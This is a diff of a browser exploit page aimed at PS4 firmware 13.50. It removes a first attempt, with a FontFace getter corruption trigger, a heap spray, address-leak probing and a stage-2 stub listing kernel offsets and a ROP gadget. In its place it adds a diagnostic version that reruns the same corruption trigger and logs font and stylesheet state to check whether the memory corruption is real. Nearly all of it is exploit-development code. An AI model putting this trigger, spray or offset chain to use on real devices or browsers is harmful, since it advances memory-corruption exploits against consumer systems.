@@ -12,144 +12,146 @@ function log(msg) {
     document.getElementById('log').textContent += msg + '\n';
 }
 
-function hex(n) {
-    return '0x' + n.toString(16);
-}
-
-// Global storage for corrupted objects
-let corruptedFonts = [];
-let exploitState = {
-    corrupted: false,
-    leaked_addr: null
-};
-
 window.onload = () => {
-    log('[*] Starting exploit for PS4 13.50...');
+    log('[*] Testing if corruption is real...\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
     void A.loaded;
     
     let fired = false;
+    let capturedState = {
+        beforeDelete: null,
+        afterDelete: null,
+        afterLayout: null
+    };
+    
     Object.defineProperty(FontFace.prototype, 'then', {
         configurable: true,
         get() {
             if (!fired && this === A) {
                 fired = true;
-                log('[+] Getter triggered - creating corruption...');
                 
-                // Create corruption with multiple fonts
-                for (let i = 0; i < 10; i++) {
-                    let f = new FontFace('corrupt' + i, 'local(Helvetica)', { 
-                        unicodeRange: 'U+004' + i 
-                    });
-                    corruptedFonts.push(f);
-                }
+                log('[1] INSIDE GETTER - corruption sequence starting...\n');
                 
+                // Capture state BEFORE corruption
+                capturedState.beforeDelete = {
+                    fonts_size: document.fonts.size,
+                    style_rules: document.getElementById('s').sheet.cssRules.length,
+                    a_status: A.status
+                };
+                log('Before corruption:');
+                log('  fonts.size: ' + capturedState.beforeDelete.fonts_size);
+                log('  CSS rules: ' + capturedState.beforeDelete.style_rules);
+                log('  A.status: ' + capturedState.beforeDelete.a_status);
+                
+                // Create new fonts
+                let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                log('\n  Created y and z fonts');
+                
+                // Delete CSS rule (this is part of the corruption)
                 document.getElementById('s').sheet.deleteRule(0);
-                document.body.offsetTop;
                 
-                exploitState.corrupted = true;
-                log('[+] Corruption triggered!');
+                capturedState.afterDelete = {
+                    fonts_size: document.fonts.size,
+                    style_rules: document.getElementById('s').sheet.cssRules.length,
+                    y_status: y.status,
+                    z_status: z.status
+                };
+                log('\nAfter CSS delete:');
+                log('  fonts.size: ' + capturedState.afterDelete.fonts_size);
+                log('  CSS rules: ' + capturedState.afterDelete.style_rules);
+                log('  y.status: ' + capturedState.afterDelete.y_status);
+                log('  z.status: ' + capturedState.afterDelete.z_status);
                 
-                // Throw to prevent OOM
+                // Force layout - THIS is the corruption trigger
+                log('\n[!] Forcing layout (offsetTop)...');
+                let offset = document.body.offsetTop;
+                log('    offsetTop returned: ' + offset);
+                
+                capturedState.afterLayout = {
+                    fonts_size: document.fonts.size,
+                    y_status: y.status,
+                    z_status: z.status,
+                    a_status: A.status
+                };
+                log('\nAfter layout:');
+                log('  fonts.size: ' + capturedState.afterLayout.fonts_size);
+                log('  y.status: ' + capturedState.afterLayout.y_status);
+                log('  z.status: ' + capturedState.afterLayout.z_status);
+                log('  A.status: ' + capturedState.afterLayout.a_status);
+                
+                log('\n[2] EXITING GETTER - if we return undefined, OOM happens');
+                log('    Throwing exception to prevent OOM...\n');
+                
+                // Store for later inspection
+                window.y_font = y;
+                window.z_font = z;
+                window.a_font = A;
+                
                 throw new Error("Controlled exit");
             }
             return undefined;
         }
     });
     
+    log('[*] Calling fonts.load()...\n');
+    
     try {
         document.fonts.load('1em x', 'AB');
+        log('[!] fonts.load() completed normally (unexpected!)');
     } catch(e) {
-        log('[*] Exception caught: ' + e.message);
+        log('[*] Caught exception: ' + e.message);
     }
     
+    // Now test if corruption persists
     setTimeout(() => {
-        log('\n[*] Post-corruption state:');
-        log('    Corrupted: ' + exploitState.corrupted);
-        log('    Corrupt fonts created: ' + corruptedFonts.length);
-        log('    document.fonts.size: ' + document.fonts.size);
+        log('\n' + '='.repeat(50));
+        log('[*] POST-CORRUPTION TESTS (500ms later):\n');
         
-        // Probe the corrupted fonts for exploitation
-        log('\n[*] Probing corrupted fonts...');
-        
-        for (let i = 0; i < corruptedFonts.length; i++) {
-            try {
-                let f = corruptedFonts[i];
-                log('    Font[' + i + ']:');
-                log('      family: ' + f.family);
-                log('      status: ' + f.status);
-                log('      weight: ' + f.weight);
-                log('      style: ' + f.style);
-                
-                // Try to trigger use-after-free or type confusion
-                f.load();
-                
-            } catch(e) {
-                log('      ERROR: ' + e.message);
-            }
+        // Test 1: Can we still access the fonts?
+        try {
+            log('Test 1: Accessing window.y_font');
+            log('  family: ' + window.y_font.family);
+            log('  status: ' + window.y_font.status);
+            log('  ✓ Font object still accessible\n');
+        } catch(e) {
+            log('  ✗ ERROR: ' + e.message + '\n');
         }
         
-        log('\n[*] Attempting to build primitives...');
-        attemptLeak();
+        // Test 2: Does the original bug still trigger OOM if we try again?
+        log('Test 2: Can we trigger OOM now with simple load?');
+        try {
+            // Try calling load on the corrupted fonts
+            // If corruption is real, this might trigger OOM
+            window.y_font.load();
+            log('  y_font.load() completed\n');
+        } catch(e) {
+            log('  ✗ ERROR: ' + e.message + '\n');
+        }
+        
+        // Test 3: Try the original trigger
+        log('Test 3: Attempting to trigger original OOM...');
+        try {
+            document.fonts.load('1em x', 'AB');
+            log('  No OOM triggered\n');
+        } catch(e) {
+            log('  Exception: ' + e.message + '\n');
+        }
+        
+        log('='.repeat(50));
+        log('\n[*] Analysis:');
+        log('If corruption is REAL:');
+        log('  - Font status values should look wrong');
+        log('  - Attempting operations on corrupted fonts should cause errors');
+        log('  - fonts.size should be inconsistent');
+        log('\nIf corruption is NOT real:');
+        log('  - Everything should work normally');
+        log('  - No errors or crashes');
         
     }, 500);
 };
-
-function attemptLeak() {
-    log('[*] Attempting address leak...');
-    
-    // Strategy: Use corrupted FontFace objects to leak heap addresses
-    // FontFace objects might have dangling pointers after corruption
-    
-    try {
-        // Create a typed array for heap spray
-        let spray = [];
-        for (let i = 0; i < 1000; i++) {
-            let arr = new Uint32Array(0x100);
-            arr[0] = 0x41414141;
-            arr[1] = 0x42424242;
-            spray.push(arr);
-        }
-        
-        log('[+] Heap spray completed');
-        
-        // Try to trigger read through corrupted font
-        for (let i = 0; i < corruptedFonts.length; i++) {
-            let f = corruptedFonts[i];
-            
-            // Access properties that might leak internal pointers
-            try {
-                // FontFace.loaded returns a Promise
-                // The Promise might contain heap addresses if font loading state is corrupted
-                let p = f.loaded;
-                log('    Font[' + i + '].loaded: ' + p);
-                
-            } catch(e) {
-                log('    Font[' + i + '] leak attempt failed: ' + e.message);
-            }
-        }
-        
-    } catch(e) {
-        log('[-] Leak failed: ' + e.message);
-    }
-}
-
-// Stage 2: After we have primitives, prepare for kernel exploit
-function stage2_kernel_setup() {
-    log('\n[*] Stage 2: Preparing kernel exploit...');
-    log('[*] Target firmware: 13.50');
-    log('[*] Kernel offsets loaded from BD-JB:');
-    log('    PRISON0:           0x111fa18');
-    log('    ROOTVNODE:         0x2136e90');
-    log('    SYSENT_661_OFFSET: 0x110a760');
-    log('    JMP_RSI_GADGET:    0x47b31');
-    
-    // This would chain to your kernel exploit
-    // For now, just demonstrating structure
-}
-
 </script>
 </body>
 </html>
